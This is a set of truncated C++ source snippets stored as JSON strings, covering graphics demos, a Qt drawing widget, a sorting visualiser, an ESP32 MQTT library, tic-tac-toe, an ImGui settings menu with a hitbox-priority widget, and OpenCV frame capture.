digit == 2 || digit == 3 || digit == 4 || digit == 7 ||\n        digit == 8 || digit == 9)\n        drawSegment(Segment::UpperRight, left, color, canvas);\n    if (digit == 2 || digit == 3 || digit == 4 || digit == 5 || digit == 6 || digit == 8 ||\n        digit == 9)\n        drawSegment(Segment::Middle, left, color, canvas);\n    if (digit == 0 || digit == 2 || digit == 6 || digit == 8)\n        drawSegment(Segment::LowerLeft, left, color, canvas);\n    if (digit == 0 || digit == 1 || digit == 3 || digit == 4 || digit == 5 || digit == 6 ||\n        digit == 7 || digit == 8 || digit == 9)\n        drawSegment(Segment::LowerRight, left, color, canvas);\n    if (digit == 0 || digit == 2 || digit == 3 || digit == 5 || digit == 6 || digit == 8 ||\n        digit == 9)\n        drawSegment(Segment::Bottom, left, color, canvas);\n}\n\nauto RefreshRateOverlay::SevenSegmentDrawer::draw(int displayFps, int renderFps, SkColor color,\n                                                  ui::Transform::RotationFlags rotation,\n                                                  ftl::Flags<Feat",
    "#include \"drawingarea.h\"\r\n\r\n#include \"drawingarea.h\"\r\n#include <QMouseEvent>\r\n#include <QPainter>\r\n#include <QFileDialog>\r\n#include <QImage>\r\n#include <QDebug>\r\n\r\nDrawingArea::DrawingArea(QWidget *parent)\r\n    : QFrame(parent), currentMode(Mode::None), movingIndex(-1)\r\n{\r\n    setFrameShape(QFrame::Box);\r\n    setStyleSheet(\"background-color: white; border: 1px solid black;\");\r\n}\r\n\r\nvoid DrawingArea::mousePressEvent(QMouseEvent *event)\r\n{\r\n    if (event->button() == Qt::RightButton) {\r\n        // \u041e\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u0440\u0438\u0441\u043e\u0432\u0430\u043d\u0438\u044f \u0438 \u0443\u0434\u0430\u043b\u0435\u043d\u0438\u0435 \u0444\u0438\u0433\u0443\u0440\u044b\r\n        currentShape = nullptr;\r\n        currentMode = Mode::None;\r\n        update();\r\n        return;\r\n    }\r\n\r\n    switch (currentMode) {\r\n    case Mode::Move:\r\n        if (event->button() == Qt::LeftButton) {\r\n            for (int i = 0; i < shapes.size(); i++) {\r\n                if (shapes[i]->contains(event->pos())) {\r\n                    movingIndex = i;\r\n                    lastMousePos = event->pos();\r\n                    setCursor(Qt::ClosedHandCursor);\r\n                    return;\r\n                }\r\n            }\r\n        } else if (event->button() == Qt::RightButton) {\r\n            movingIndex = -1;\r\n            setCursor(Qt::ArrowCursor);\r\n            update();\r\n        }\r\n        break;\r\n    case Mode::Delete:\r\n        if (event->button() == Qt::LeftButton) {\r\n            for (int i = 0; i < shapes.size(); i++) {\r\n                if (shapes[i]->contains(event->pos())) {\r\n                    removeShape(i);\r\n                    update();\r\n                    return;\r\n                }\r\n            }\r\n        } else if (event->button() == Qt::RightButton) {\r\n            currentMode = Mode::None;\r\n            update();\r\n        }\r\n        break;\r\n    case Mode::Connection:\r\n        if (event->button() == Qt::LeftButton) {\r\n            for (int i = 0; i < shapes.size(); ++i) {\r\n                if (shapes[i]->contains(event->pos())) {\r\n                    if (connectionStartPoint.isNull()) {\r\n                        connectionStartPoint = shapes[i]->boundingRect().center();\r\n                        connectionEndPoint = connectionStartPoint;\r\n                        startShapeIndex = i;\r\n                    } else {\r\n                        connectionEndPoint = shapes[i]->boundingRect().center();\r\n                        if (startShapeIndex != i) {\r\n                            connections.push_back(std::make_pair(startShapeIndex, i));\r\n                        }\r\n                        connectionStartPoint = QPoint();\r\n                        connectionEndPoint = QPoint();\r\n                        currentMode = Mode::None;\r\n                    }\r\n                    update();\r\n                    return;\r\n                }\r\n            }\r\n            connectionStartPoint = QPoint();\r\n            connectionEndPoint = QPoint();\r\n            currentMode = Mode::None;\r\n            update();\r\n        } else if (event->button() == Qt::RightButton) {\r\n            connectionStartPoint = QPoint();\r\n            connectionEndPoint = QPoint();\r\n            currentMode = Mode::None;\r\n            update();\r\n        }\r\n        break;\r\n    case Mode::Rectangle:\r\n    case Mode::Ellipse:\r\n    case Mode::Triangle:\r\n        if (event->button() == Qt::LeftButton) {\r\n            startPoint = event->pos();\r\n            QRect rect;\r\n            rect.setTopLeft(startPoint);\r\n            rect.setBottomRight(startPoint);\r\n            if (currentMode == Mode::Rectangle) {\r\n                currentShape = std::make_shared<RectangleShape>(rect);\r\n            } else if (currentMode == Mode::Ellipse) {\r\n                currentShape = std::make_shared<EllipseShape>(rect);\r\n            } else if (currentMode == Mode::Triangle) {\r\n                currentShape = std::make_shared<TriangleShape>(rect);\r\n            }\r\n            update();\r\n        }\r\n        update();\r\n        break;\r\n    default:\r\n        break;\r\n    }\r\n}\r\n\r\nvoid DrawingArea::mouseMoveEvent(QMouseEvent *event)\r\n{\r\n    if (currentMode == Mode::Move && movingIndex >= 0) {\r\n        QPoint offset = event->pos() - lastMousePos;\r\n        shapes[movingIndex]->move(offset);\r\n        lastMousePos = event->pos();\r\n        update();\r\n    } else if (currentMode == Mode::Connection && !connectionStartPoint.isNull()) {\r\n        connectionEndPoint = event->pos();\r\n        update();\r\n    } else if (currentMode != Mode::None && currentShape) {\r\n        QRect rect = currentShape->boundingRect();\r\n        rect.setBottomRight(event->pos());\r\n        currentShape->setRect(rect);\r\n        update();\r\n    }\r\n}\r\n\r\nvoid DrawingArea::mouseReleaseEvent(QMouseEvent *event)\r\n{\r\n    if (currentMode == Mode::Move && movingIndex >= 0 && event->button() == Qt::LeftButton) {\r\n        movingIndex = -1;\r\n        setCursor(Qt::ArrowCursor);\r\n        update();\r\n    } else if (currentShape && event->button() == Qt::LeftButton) {\r\n        if (event->button() == Qt::RightButton){\r\n            currentShape = nullptr;\r\n            currentMode = Mode::None;\r\n            return;\r\n     ",
    "#include \"InsertSort.h\"\r\n#include <QThread>\r\n#include <QTimer>\r\n\r\nInsertSort::InsertSort(MainWindow *visual) : visual(visual), array(visual->getArray())\r\n{\r\n}\r\n\r\nvoid InsertSort::startSort()\r\n{\r\n    QThread *thread = new QThread;\r\n    this->moveToThread(thread);\r\n\r\n    connect(thread, &QThread::started, this, &InsertSort::runSort);\r\n    connect(this, &InsertSort::finished, thread, &QThread::quit);\r\n    connect(thread, &QThread::finished, thread, &QThread::deleteLater);\r\n\r\n    thread->start();\r\n}\r\n\r\nvoid InsertSort::runSort()\r\n{\r\n    QThread::msleep(500);\r\n\r\n    int n = array.n;\r\n    for (int i = 1; i < n; i++) {\r\n        int key = array.get(i);\r\n        int j = i - 1;\r\n        while (j >= 0 && array.get(j) > key) {\r\n            array.set(array.get(j), j + 1);\r\n            j--;\r\n            QThread::msleep(5);\r\n            visual->update();\r\n        }\r\n        array.set(key, j + 1);\r\n\r\n        QThread::msleep(5);\r\n        visual->update();\r\n    }\r\n\r\n    QThread::msleep(2000);\r\n    emit finished();\r\n}\r\n",
    "// Innclude main header file.\n#include \"esp32SpiAtMqtt.h\"\n\n/**\n * @brief   Construct a new WiFiMQTT:: object. It gets the main At Command Buffer address.\n * \n */\nWiFiMQTT::WiFiMQTT()\n{\n    // Get the pointer of the data buffer of the ESP32 SPI WiFi library.\n    _atCommandBuffer = WiFi.getDataBuffer();\n}\n\n/**\n * @brief   Destructor for the WiFiMQTT object. It will free allocated memory on the\n *          object destruct.\n * \n */\nWiFiMQTT::~WiFiMQTT()\n{\n    // Free up the allocated memory (but only if is allocated by malloc, not user defined buffer!).\n    if (_allocated)\n    {\n        // Free up allocated memory.\n        free(_rxDataBuffer);\n\n        // Set the flag to false.\n        _allocated = false;\n    }\n}\n\n/**\n * @brief   Initializer for the WiFiMQTT library. It will allocate memory for the incomming\n *          MQTT messages.\n * \n * @param   uint16_t _rxBufferSize\n *          Size of the allocated buffer (in bytes). \n * @return  bool\n *          true - Memory allocation is successful.\n *          false - Memory allocation failed.\n */\nbool WiFiMQTT::begin(uint16_t _rxBufferSize)\n{\n    // Allocate the memory for the RX buffer. If not specified, buffer will be 1024 bytes.\n    _rxDataBuffer = (char*)malloc(_rxBufferSize * sizeof(uint8_t));\n\n    // Check for the success memory allocation.\n    if (_rxDataBuffer != NULL)\n    {\n        // Set the flag.\n        _allocated = true;\n\n        // Copy buffer size locally in the class.\n        _maxRxBufferSize = _rxBufferSize;\n        \n        // Return true for success.\n        return true;\n    }\n\n    // Allocation failed? Return false.\n    return false; \n}\n\n/**\n * @brief   Initializer for the WiFiMQTT library. Use user-defined buffer for incomming MQTT messages.\n * \n * @param   uint8_t *_rxBuffer\n *          Pointer to the user defined buffer for incomming MQTT messages.\n * @param   uint16_t _rxBufferSize\n *          Buffer size in bytes.\n * @return  bool\n *          true - Buffer will be used as buffer for the incomming MQTT messages.\n *          false - Buffer cannot be used (maybe thev address of the buffer is nul?).\n */\nbool WiFiMQTT::begin(uint8_t *_rxBuffer, uint16_t _rxBufferSize)\n{\n    // Check the pointer (watch out for null pointer!).\n    if (_rxBuffer == NULL) return false;\n\n    // Save adday address locally.\n    _rxDataBuffer = (char*)_rxBuffer;\n\n    // Copy buffer size locally in the class.\n    _maxRxBufferSize = _rxBufferSize;\n\n    // Set the flag.\n    _allocated = false;\n\n    // Return true for success.\n    return true;\n}\n\n/**\n * @brief   Method set the MQTT server domain or IP address and port.\n * \n * @param   char *_mqttServer\n *          MQTT Server/Broker domain or IP address.\n * @param   uint16_t _mqttPort\n *          MQTT Server/Broker port (usually 1883).\n * @return  bool\n *          true - MQTT server/broker is set correctly\n *          false - MQTT server set is faild (check _mqttServer array address, maybe is NULL?).\n * @note    This does not instantlly set these data to the ESP32, instead it stores them locally, so it's\n *          advisable to not use locally variables for MQTT server.\n */\nbool WiFiMQTT::setServer(char *_mqttServer, uint16_t _mqttPort)\n{\n    // Just save the data internally. Data will be used in WiFiMQTT:connect().\n    // But do not forget check null pointer!\n    if (_mqttServer == NULL) return false;\n\n    // Copy parameters locally.\n    _serverPtr = _mqttServer;\n    _port = _mqttPort;\n\n    // Return true.\n    return true;\n}\n\n/**\n * @brief   Connect to the MQTT Server with MQTT ClientID, Username and password.\n * \n * @param   char *_clientId\n *          ClientID used in MQTT. If not used, use NULL pointer.\n * @param   char *_userName\n *          Username for auth used in MQTT. If not used, use NULL pointer.\n * @param   char *_password\n *          Password for auth used in MQTT. If not used, use NULL pointer.\n * @return  bool\n *          true - Connection to the MQTT broker/server was successfull.\n *          false - Connection failed.\n */\nbool WiFiMQTT::connect(char *_clientId, char *_userName, char *_password)\n{\n    // First set MQTT user config. Keep ClientIC, username and password blank sice these will be updated by using\n    // dedicated AT Commands AT+MQTTLONGCLIENTID, AT+MQTTLONGUSERNAME and AT+MQTTLONGPASSWORD.\n    if (!WiFi.sendAtCommandWithResponse((char*)\"AT+MQTTUSERCFG=0,1,\\\"\\\",\\\"\\\",\\\"\\\",0,0,\\\"\\\"\\r\\n\", 200ULL, 4ULL, (char*)esp32AtCmdResponseOK, INKPLATE_ESP32_AT_EXPECTED_RESPONSE_START, true)) return false;\n\n    // First set up the client ID if needed.\n    if (_clientId != NULL)\n    {\n        sprintf(_atCommandBuffer, \"AT+MQTTLONGUSERNAME=0,%d\\r\\n\", strlen(_clientId));\n        if (!WiFi.sendAtCommandWithResponse(_atCommandBuffer, 200ULL, 4ULL, (char*)\"\\r\\nOK\\r\\n\\r\\n>\", INKPLATE_ESP32_AT_EXPECTED_RESPONSE_START, true, _clientId, strlen(_clientId), 20ULL, (char*)esp32AtCmdResponseOK)) return false;\n    }\n\n    // Now set up the username in nedeed.\n    if (_userName != NULL)\n    {\n        sprintf(_atCommandBuffer, ",
    "#include <iostream>\r\n#include <vector>\r\n\r\nusing namespace std;\r\n\r\n// Function to print the Tic Tac Toe board\r\nvoid printBoard(const vector<vector<char>>& board) {\r\n    for (int i = 0; i < 3; ++i) {\r\n        for (int j = 0; j < 3; ++j) {\r\n            cout << board[i][j] << \" \";\r\n        }\r\n        cout << endl;\r\n    }\r\n}\r\n\r\n// Function to check if a player has won\r\nbool checkWin(const vector<vector<char>>& board, char player) {\r\n    // Check rows and columns\r\n    for (int i = 0; i < 3; ++i) {\r\n        if ((board[i][0] == player && board[i][1] == player && board[i][2] == player) ||\r\n            (board[0][i] == player && board[1][i] == player && board[2][i] == player)) {\r\n            return true;\r\n        }\r\n    }\r\n\r\n    // Check diagonals\r\n    if ((board[0][0] == player && board[1][1] == player && board[2][2] == player) ||\r\n        (board[0][2] == player && board[1][1] == player && board[2][0] == player)) {\r\n        return true;\r\n    }\r\n\r\n    return false;\r\n}\r\n\r\nint main() {\r\n    vector<vector<char>> board(3, vector<char>(3, '-'));\r\n    int moves = 0;\r\n    char currentPlayer = 'X';\r\n\r\n    while (moves < 9) {\r\n        printBoard(board);\r\n        int row, col;\r\n        cout << \"Player \" << currentPlayer << \", enter your move (row and column): \";\r\n        cin >> row >> col;\r\n\r\n        if (row < 0 || row > 2 || col < 0 || col > 2 || board[row][col] != '-') {\r\n            cout << \"Invalid move. Try again.\" << endl;\r\n            continue;\r\n        }\r\n\r\n        board[row][col] = currentPlayer;\r\n\r\n        if (checkWin(board, currentPlayer)) {\r\n            printBoard(board);\r\n            cout << \"Player \" << currentPlayer << \" wins!\" << endl;\r\n            break;\r\n        }\r\n\r\n        currentPlayer = (currentPlayer == 'X') ? 'O' : 'X';\r\n        ++moves;\r\n    }\r\n\r\n    if (moves == 9) {\r\n        printBoard(board);\r\n        cout << \"It's a draw!\" << endl;\r\n    }\r\n\r\n    return 0;\r\n}",
    "#include <GL/glut.h>\r\n#include <stdlib.h>\r\n#include <math.h>\r\n#include <time.h>\r\n\r\nstatic int slices = 50;\r\nstatic int stacks = 50;\r\nconst int starCount = 1000;\r\nstatic double star_positions[starCount][3];\r\n\r\ndouble zoomFactor = 1.0;\r\nconst double zoomSpeed = 0.1;\r\n\r\nvoid initStarPositions()\r\n{\r\n    srand(time(NULL));\r\n\r\n    for (int i = 0; i < starCount; ++i)\r\n    {\r\n        star_positions[i][0] = (rand() % 1000 - 500) / 10.0;\r\n        star_positions[i][1] = (rand() % 1000 - 500) / 10.0;\r\n        star_positions[i][2] = (rand() % 1000 - 500) / 10.0;\r\n    }\r\n}\r\n\r\nvoid init()\r\n{\r\n    glEnable(GL_DEPTH_TEST);\r\n    glEnable(GL_LIGHTING);\r\n    glEnable(GL_LIGHT0);\r\n    glEnable(GL_COLOR_MATERIAL);\r\n\r\n    GLfloat light_ambient[] = {0.0f, 0.0f, 0.0f, 1.0f};\r\n    GLfloat light_diffuse[] = {1.0f, 1.0f, 1.0f, 1.0f};\r\n    GLfloat light_specular[] = {1.0f, 1.0f, 1.0f, 1.0f};\r\n    GLfloat light_position[] = {0.0f, 0.0f, 2.0f, 1.0f};\r\n\r\n    glLightfv(GL_LIGHT0, GL_AMBIENT, light_ambient);\r\n    glLightfv(GL_LIGHT0, GL_DIFFUSE, light_diffuse);\r\n    glLightfv(GL_LIGHT0, GL_SPECULAR, light_specular);\r\n    glLightfv(GL_LIGHT0, GL_POSITION, light_position);\r\n\r\n    glEnable(GL_BLEND);\r\n    glBlendFunc(GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA);\r\n}\r\n\r\nstatic void resize(int width, int height)\r\n{\r\n    const float aspect_ratio = (float)width / (float)height;\r\n\r\n    glViewport(0, 0, width, height);\r\n    glMatrixMode(GL_PROJECTION);\r\n\r\n    glLoadIdentity();\r\n    gluPerspective(45.0/ zoomFactor, aspect_ratio, 1.0, 100.0);\r\n\r\n    glMatrixMode(GL_MODELVIEW);\r\n    glLoadIdentity();\r\n    gluLookAt(0.0, 15.0, 25.0,\r\n              0.0, 0.0, 0.0,\r\n              0.0, 1.0, 0.0);\r\n}\r\n\r\nvoid drawOrbit(double radius)\r\n{\r\n    int segment_number = 100;\r\n    glBegin(GL_LINE_LOOP);\r\n    for (int i = 0; i < segment_number; i++)\r\n    {\r\n        double teta = 2.0f * 3.1415926f * i / segment_number;\r\n        double x = radius * cosf(teta);\r\n        double z = radius * sinf(teta);\r\n        glVertex3f(x, 0.0, z);\r\n    }\r\n    glEnd();\r\n}\r\n\r\nvoid drawPlanet(double distance, double size, double angle, double r, double g, double b)\r\n{\r\n    glPushMatrix();\r\n    glColor3d(r, g, b);\r\n    glRotated(angle, 0, 1, 0);\r\n    glTranslated(distance, 0.0, 0.0);\r\n    glutSolidSphere(size, slices, stacks);\r\n    glPopMatrix();\r\n}\r\n\r\nvoid drawStars()\r\n{\r\n    glDisable(GL_LIGHTING);\r\n    glBegin(GL_POINTS);\r\n    glColor3d(1.0, 1.0, 1.0);\r\n\r\n    for (int i = 0; i < starCount; ++i)\r\n    {\r\n        double x = star_positions[i][0];\r\n        double y = star_positions[i][1];\r\n        double z = star_positions[i][2];\r\n        glVertex3d(x, y, z);\r\n    }\r\n\r\n    glEnd();\r\n    glEnable(GL_LIGHTING);\r\n}\r\n\r\nvoid drawSunGlow()\r\n{\r\n    const double t = glutGet(GLUT_ELAPSED_TIME) / 1000.0;\r\n    const double pulse = 0.5 + 0.4 * sin(0.5 * M_PI * t);\r\n\r\n    glPushMatrix();\r\n    glColor4f(1.0, 1.0, 0.0, 0.3 * pulse);\r\n    glDisable(GL_DEPTH_TEST);\r\n    glEnable(GL_BLEND);\r\n    glBlendFunc(GL_SRC_ALPHA, GL_ONE);\r\n    glutSolidSphere(1.5, slices, stacks);\r\n    glDisable(GL_BLEND);\r\n    glEnable(GL_DEPTH_TEST);\r\n    glPopMatrix();\r\n}\r\n\r\nstatic void display(void)\r\n{\r\n    const double t = glutGet(GLUT_ELAPSED_TIME) / 1000.0;\r\n    const double speed_scale = 1.0;\r\n    const double rotation_angles[] = {\r\n        t * (360.0 / 60.0) * speed_scale,\r\n        t * (360.0 / 300.0) * speed_scale,\r\n        t * (360.0 / 24.0) * speed_scale,\r\n        t * (360.0 / 24.6) * speed_scale,\r\n        t * (360.0 / 9.9) * speed_scale,\r\n        t * (360.0 / 10.7) * speed_scale,\r\n        t * (360.0 / 17.2) * speed_scale,\r\n        t * (360.0 / 16.1) * speed_scale\r\n    };\r\n\r\n    glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\r\n\r\n    drawStars();\r\n\r\n    glPushMatrix();\r\n    glColor3d(1, 1, 0);\r\n    glTranslated(0.0, 0.0, 0.0);\r\n    glutSolidSphere(1.0, slices, stacks);\r\n    glPopMatrix();\r\n\r\n    drawSunGlow();\r\n\r\n    struct\r\n    {\r\n        double distance;\r\n        double size;\r\n        double r, g, b;\r\n    } planets[] = {\r\n        {2.0, 0.1, 0.5, 0.5, 0.5},\r\n        {3.0, 0.2, 1.0, 0.5, 0.0},\r\n        {4.0, 0.2, 0.0, 0.0, 1.0},\r\n        {5.0, 0.15, 1.0, 0.0, 0.0},\r\n        {7.0, 0.5, 1.0, 0.5, 0.0},\r\n        {9.0, 0.4, 0.9, 0.8, 0.4},\r\n        {11.0, 0.3, 0.0, 0.5, 1.0},\r\n        {13.0, 0.3, 0.0, 0.0, 0.5}\r\n    };\r\n\r\n    for (int i = 0; i < 8; i++)\r\n    {\r\n        glPushMatrix();\r\n        glColor3d(1, 1, 1);\r\n        drawOrbit(planets[i].distance);\r\n        glPopMatrix();\r\n\r\n        drawPlanet(planets[i].distance, planets[i].size, rotation_angles[i], planets[i].r, planets[i].g, planets[i].b);\r\n    }\r\n\r\n    glutSwapBuffers();\r\n}\r\n\r\nstatic void key(unsigned char key, int x, int y) {\r\n    switch (key) {\r\n    case 27:\r\n    case 'q':\r\n        exit(0);\r\n        break;\r\n    case '+':\r\n        zoomFactor += zoomSpeed;\r\n        resize(glutGet(GLUT_WINDOW_WIDTH), glutGet(GLUT_WINDOW_HEIGHT));\r\n        break;\r\n    case '-':\r\n        zoomFactor -= zoomSpeed;\r\n        if (zoomFactor < 0.1) zoomFactor = 0.1;\r\n        resize(glutGet(GLUT_WIND",
    "\ufeff// This is an independent project of an individual developer. Dear PVS-Studio, please check it.\n// PVS-Studio Static Code Analyzer for C, C++, C#, and Java: http://www.viva64.com\n\n#include \"others.h\"\n#include \"../../../config/config.h\"\n#include <array>\n#include \"buttons.h\"\n#include \"combos.h\"\n#include \"../../../render.h\"\n\n#include <future>\n#include <functional>\n#include \"../../../globals.h\"\n#include \"color_pickers.h\"\n\n#include \"../../../features/features.h\"\nconstexpr std::array<const char*, 166U> keyNames =\n{\n\t\"\",\n\t\"mouse 1\", \"mouse 2\", \"cancel\", \"mouse 3\", \"mouse 4\", \"mouse 5\", \"\",\n\t\"backspace\", \"tab\", \"\", \"\", \"clear\", \"enter\", \"\", \"\",\n\t\"shift\", \"control\", \"alt\", \"pause\", \"caps\", \"\", \"\", \"\", \"\", \"\", \"\",\n\t\"escape\", \"\", \"\", \"\", \"\", \"space\", \"page up\", \"page down\",\n\t\"end\", \"home\", \"left\", \"up\", \"right\", \"down\", \"\", \"\", \"\",\n\t\"print\", \"insert\", \"delete\", \"\",\n\t\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\",\n\t\"\", \"\", \"\", \"\", \"\", \"\", \"\",\n\t\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\",\n\t\"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\",\n\t\"v\", \"w\", \"x\", \"y\", \"z\", \"lwin\", \"rwin\", \"\", \"\", \"\",\n\t\"num0\", \"num1\", \"num2\", \"num3\", \"num4\", \"num5\",\n\t\"num6\", \"num7\", \"num8\", \"num9\",\n\t\"*\", \"+\", \"\", \"-\", \".\", \"/\",\n\t\"f1\", \"f2\", \"f3\", \"f4\", \"f5\", \"f6\", \"f7\", \"f8\",\n\t\"f9\", \"f10\", \"f11\", \"f12\", \"f13\", \"f14\", \"f15\", \"f16\",\n\t\"f17\", \"f18\", \"f19\", \"f20\", \"f21\", \"f22\", \"f23\", \"f24\",\n\t\"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\",\n\t\"num lock\", \"scroll lock\",\n\t\"\", \"\", \"\", \"\", \"\", \"\", \"\",\n\t\"\", \"\", \"\", \"\", \"\", \"\", \"\",\n\t\"lshift\", \"rshift\", \"lctrl\",\n\t\"rctrl\", \"lmenu\", \"rmenu\"\n};\n\nnamespace imgui_ex\n{\n\tImGuiStyle backup_style = ImGuiStyle();\n\tbool slider_float(const char* label, float* v, float v_min,\n\t\tfloat v_max, const char* format = \"%.2f\", float width = 205.0f, ImGuiSliderFlags flags = 0);\n\n\tbool selectable(const char* label, bool selected = false,\n\t\tImGuiSelectableFlags flags = 0, const ImVec2& size_arg = ImVec2(0.0f, 0.0f), float expected_h = 0.0f, int item_id = -1, void* bool_ptr = nullptr);\n\n\tvoid draw_text(ImDrawList* draw_list, const char* text, const ImVec2& pos,\n\t\tImFont* font = core::f::dinpro_bold, float font_size = 16.0f, const char* text_end = nullptr);\n\n\tvoid same_line(float spacing_w, float offset_from_start_x)\n\t{\n\t\tImGui::SameLine(offset_from_start_x, u::dpi(spacing_w));\n\t}\n\n\tvoid text(const char* fmt, ...)\n\t{\n\t\tImGui::PushStyleVar(ImGuiStyleVar_ItemSpacing, ImVec2(0.0f, 0.0f));\n\t\tImGui::Text(core::f::dinpro, u::dpi(17.0f), fmt);\n\t\tImGui::PopStyleVar();\n\t}\n\n\tvoid hitbox_priority(const char* label, const ImVec2& size_arg, int& head_pr,\n\t\tint& body_pr, int& pelvis_pr, int& legs_pr, int& feet_pr, int& arms_pr)\n\t{\n\t\tImGuiWindow* window = ImGui::GetCurrentWindow();\n\n\t\tif (window->SkipItems)\n\t\t\treturn;\n\n\t\tImGuiContext& g = *GImGui;\n\n\t\tconst ImGuiStyle& style = g.Style;\n\t\tconst ImGuiID id = window->GetID(label);\n\n\t\tconst ImVec2 label_size = ImGui::CalcTextSize(core::f::dinpro,\n\t\t\tu::dpi(17.0f), label, nullptr, true);\n\n\t\tImVec2 pos = window->DC.CursorPos;\n\n\t\tImVec2 size = ImGui::CalcItemSize(u::dpi(size_arg),\n\t\t\tlabel_size.x + style.FramePadding.x * 2.0f, label_size.y + style.FramePadding.y * 2.0f);\n\n\t\tconst ImRect bb(pos, pos + size);\n\t\tImGui::ItemSize(size, style.FramePadding.y);\n\n\t\tif (!ImGui::ItemAdd(bb, id))\n\t\t\treturn;\n\n\t\tstd::vector<ImRect> bb_hitboxes =\n\t\t{\n\t\t\t{ bb.Min + u::dpi(ImVec2(40.0f, 30.0f)),\n\t\t\t\tbb.Min + u::dpi(ImVec2(80.0f, 70.0f)) }, // head\n\t\t\t{ bb.Min + u::dpi(ImVec2(35.0f, 70.0f)),\n\t\t\t\tbb.Min + u::dpi(ImVec2(85.0f, 105.0f)) }, // body\n\t\t\t{ bb.Min + u::dpi(ImVec2(35.0f, 105.0f)),\n\t\t\t\tbb.Min + u::dpi(ImVec2(85.0f, 135.0f)) }, // pelvis\n\t\t\t{ bb.Min + u::dpi(ImVec2(35.0f, 135.0f)),\n\t\t\t\tbb.Min + u::dpi(ImVec2(85.0f, 205.0f)) }, // legs\n\t\t\t{ bb.Min + u::dpi(ImVec2(30.0f, 205.0f)),\n\t\t\t\tbb.Min + u::dpi(ImVec2(90.0f, 240.0f)) }, // feet\n\t\t\t{ bb.Min + u::dpi(ImVec2(0.0f, 70.0f)),\n\t\t\t\tbb.Min + u::dpi(ImVec2(35.0f, 145.0f)) }, // left arm\n\t\t\t{ bb.Min + u::dpi(ImVec2(85.0f, 80.0f)),\n\t\t\t\tbb.Min + u::dpi(ImVec2(120.0f, 145.0f)) }, // right arm\n\t\t};\n\n\t\tfor (size_t i = 0; i < bb_hitboxes.size(); i++)\n\t\t{\n\n\t\t\tbool hovered = false, held = false;\n\t\t\tImGui::ButtonBehavior(bb_hitboxes[i], id, &hovered, &held, 0);\n\n\t\t\tif (hovered)\n\t\t\t{\n\t\t\t\tif (ImGui::IsMouseClicked(ImGuiMouseButton_Left))\n\t\t\t\t{\n\t\t\t\t\tswitch (i)\n\t\t\t\t\t{\n\t\t\t\t\tcase 0: head_pr++; break;\n\t\t\t\t\tcase 1: body_pr++; break;\n\t\t\t\t\tcase 2: pelvis_pr++; break;\n\t\t\t\t\tcase 3: legs_pr++; break;\n\t\t\t\t\tcase 4: feet_pr++; break;\n\t\t\t\t\tcase 5: case 6: arms_pr++; break;\n\t\t\t\t\tdefault: break;\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\tif (ImGui::IsMouseClicked(ImGuiMouseButton_Right))\n\t\t\t\t{\n\t\t\t\t\tswitch (i)\n\t\t\t\t\t{\n\t\t\t\t\tcase 0: head_pr--; break;\n\t\t\t\t\tcase 1: body_pr--; break;\n\t\t\t\t\tcase 2: pelvis_pr--; break;\n\t\t\t\t\tcase 3: legs_pr--; break;\n\t\t\t\t\tcase 4: feet_pr--; break;\n\t\t\t\t\tcase 5: case 6: arms_pr--; break;\n\t\t\t\t\tdefault: break;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n#define IMGUI_P ImVec2(0.0f, 0.0f), ImVec2(1.0f, 1.0f)\n\n\t\t// Render\n\t\tImGui::RenderNavHighlight(bb, id);\n\n\t\tauto change_color = [](int& priority, float alpha) -> ImU32\n\t\t{\n\t\t\tif (prio",
    "\ufeff//\n// Created by gzyit on 2024/7/2.\n//\n\n#include <pybind11/pybind11.h>\n#include <pybind11/numpy.h>\n#include <opencv2/opencv.hpp>\n#include <utility>\n#include <iostream>\n#include <chrono>\n#include <cstdio>\n#include <thread> // \u6dfb\u52a0\u7ebf\u7a0b\u5e93\n#include <mutex> // \u6dfb\u52a0\u4e92\u65a5\u9501\u5e93\n#include <deque> // \u7528\u4e8e\u5b58\u653e\u5e27\u7684\u53cc\u7aef\u961f\u5217\n\n\nnamespace py = pybind11;\n\n// \u8ba1\u65f6\u5668\u7c7b\uff0c\u7528\u4e8e\u7edf\u8ba1\u51fd\u6570\u6267\u884c\u65f6\u95f4\nclass ScopeTimer {\npublic:\n    explicit ScopeTimer(const std::string &msg = \"\") : message(msg), start(std::chrono::high_resolution_clock::now()) {}\n\n    ~ScopeTimer() {\n        auto end = std::chrono::high_resolution_clock::now();\n        auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end - start).count();\n        std::cout << message << \" took \" << duration / 1000.0 << \" ms\" << std::endl;\n    }\n\nprivate:\n    std::string message;\n    std::chrono::time_point<std::chrono::high_resolution_clock> start;\n};\n\n\n// \u5c06fourcc\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\nstd::string fourccToString(int fourcc) {\n    char arr[5];\n    arr[3] = (fourcc >> 24) & 0xFF;\n    arr[2] = (fourcc >> 16) & 0xFF;\n    arr[1] = (fourcc >> 8) & 0xFF;\n    arr[0] = fourcc & 0xFF;\n    arr[4] = '\\0'; // Null terminator for C string\n\n    printf(\"%d %d %d %d\\n\", arr[0], arr[1], arr[2], arr[3]);\n    return std::string(arr);\n}\n\nstd::mutex mtx; // \u7528\u4e8e\u4fdd\u62a4frame\u7684\u4e92\u65a5\u9501\ncv::Mat frame; // \u5168\u5c40\u53d8\u91cf\uff0c\u7528\u4e8e\u8de8\u7ebf\u7a0b\u5171\u4eab\u5e27\u6570\u636e\n// \u65b0\u7ebf\u7a0b\u5904\u7406\u51fd\u6570\nvoid captureFrames(cv::VideoCapture &cap) {\n    while (true) {\n        auto start = std::chrono::high_resolution_clock::now();\n        //--------------------------------------------------------------------\n        if (!cap.read(frame)) {\n            std::cerr << \"read frame failed!\" << std::endl;\n            break;\n        }\n\n        //--------------------------------------------------------------------\n        auto stop = std::chrono::high_resolution_clock::now();\n        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(stop - start);\n        std::cout << \"Function execution time: \" << duration.count() << \" ms\" << std::endl;\n    }\n    cap.release(); // 